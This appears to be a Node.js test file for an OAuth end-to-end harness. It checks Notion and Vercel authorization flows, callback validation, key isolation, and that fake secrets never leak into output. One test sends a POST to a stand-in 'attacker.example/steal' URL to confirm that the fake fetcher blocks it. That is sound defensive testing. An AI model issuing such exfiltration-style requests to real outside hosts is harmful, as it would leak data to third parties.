/**
 * Batch 15 · auth-e2e-harness tests.
 *
 * Runs the isolated HTTP end-to-end harness over a real Node loopback server.
 * Every provider response and every KV write is faked; no internet, no vault,
 * no real KV, no stdout token/client_secret. Each test asserts the harness
 * report's `{ok, checks[]}` shape and the individual named check, plus a
 * global stdout/stderr leak guard over the fake secret strings.
 */
import test from 'node:test';
import assert from 'node:assert/strict';

import { runAuthE2E, FAKE, createFakeFetch, FakeStore } from '../scripts/auth-e2e-harness.mjs';

function byName(result, name) {
  const check = result.checks.find((item) => item.name === name);
  assert.ok(check, `missing check ${name}`);
  return check;
}

/** Capture stdout/stderr for one harness run, then assert no secret leaked. */
async function quietRun(options) {
  const originalLog = console.log;
  const originalError = console.error;
  const originalWrite = process.stdout.write.bind(process.stdout);
  const chunks = [];
  console.log = (...args) => { chunks.push(args.map(String).join(' ')); };
  console.error = (...args) => { chunks.push(args.map(String).join(' ')); };
  process.stdout.write = (chunk, ...rest) => {
    chunks.push(String(chunk));
    return originalWrite(chunk, ...rest);
  };
  try {
    const result = await runAuthE2E(options);
    const output = chunks.join('\n');
    for (const secret of [FAKE.access, FAKE.refresh, FAKE.rotatedAccess, FAKE.adminKey]) {
      assert.equal(output.includes(secret), false, `harness output leaked ${secret.slice(0, 8)}`);
    }
    return result;
  } finally {
    console.log = originalLog;
    console.error = originalError;
    process.stdout.write = originalWrite;
  }
}

test('auth-e2e-harness: happy path reports ok with every check passing', async () => {
  const result = await quietRun();
  assert.equal(result.ok, true);
  assert.ok(result.checks.length >= 10);
  assert.equal(result.checks.every((item) => item.ok === true), true);
  for (const item of result.checks) {
    assert.equal(typeof item.name, 'string');
    assert.ok(item.name.length > 0);
  }
});

test('auth-e2e-harness: Notion DCR registers once, redirects and seeds a v2 gateway grant', async () => {
  const result = await quietRun();
  assert.equal(byName(result, 'notion-dcr-start-register-redirect').ok, true);
  assert.equal(byName(result, 'notion-dcr-repeated-start-reuses-client').ok, true);
  assert.equal(byName(result, 'notion-dcr-callback-seeds-v2-gateway-grant').ok, true);
});

test('auth-e2e-harness: Vercel CIMD document route returns JSON and authorize asks for offline_access', async () => {
  const result = await quietRun();
  assert.equal(byName(result, 'vercel-cimd-document-route-200').ok, true);
  assert.equal(byName(result, 'vercel-cimd-authorize-scope-and-resource').ok, true);
});

test('auth-e2e-harness: callback without refresh_token fails with 400 and no grant', async () => {
  const result = await quietRun({ vercelNoRefresh: true });
  // The harness variant is fixed-string driven; the baseline run includes a
  // dedicated no-refresh check that must pass, and the overall run stays ok.
  assert.equal(byName(result, 'vercel-cimd-callback-no-refresh-token-400').ok, true);
  assert.equal(result.ok, true);
});

test('auth-e2e-harness: missing state and wrong environment are rejected', async () => {
  const result = await quietRun();
  assert.equal(byName(result, 'callback-missing-state-400').ok, true);
  assert.equal(byName(result, 'callback-wrong-environment-400').ok, true);
});

test('auth-e2e-harness: shared DSH grant is never refreshed; preview/prod keys isolated', async () => {
  const result = await quietRun();
  assert.equal(byName(result, 'shared-grant-never-refreshed').ok, true);
  assert.equal(byName(result, 'preview-production-key-isolation').ok, true);
});

test('auth-e2e-harness: fake fetcher blocks any URL outside the provider allowlist', async () => {
  const store = new FakeStore();
  const fetchImpl = createFakeFetch(store);
  await assert.rejects(
    () => fetchImpl('https://attacker.example/steal', { method: 'POST' }),
    /blocked unexpected network URL/,
  );
  assert.equal(store.tokenExchanges, 0);
});

test('auth-e2e-harness: an injected failure makes ok=false and names the failing check', async () => {
  const result = await quietRun({ failCheck: 'notion-dcr-start-register-redirect' });
  assert.equal(result.ok, false);
  const failed = byName(result, 'notion-dcr-start-register-redirect');
  assert.equal(failed.ok, false);
  assert.match(failed.error, /injected harness failure/);
});

test('auth-e2e-harness: report is serializable and never contains raw secret literals', async () => {
  const result = await quietRun();
  const serialized = JSON.stringify(result);
  for (const secret of [FAKE.access, FAKE.refresh, FAKE.rotatedAccess, FAKE.adminKey]) {
    assert.equal(serialized.includes(secret), false, 'report exposed a fake secret');
  }
  const parsed = JSON.parse(serialized);
  assert.equal(parsed.ok, true);
  assert.deepEqual(parsed.checks.map((c) => c.ok), result.checks.map((c) => c.ok));
});
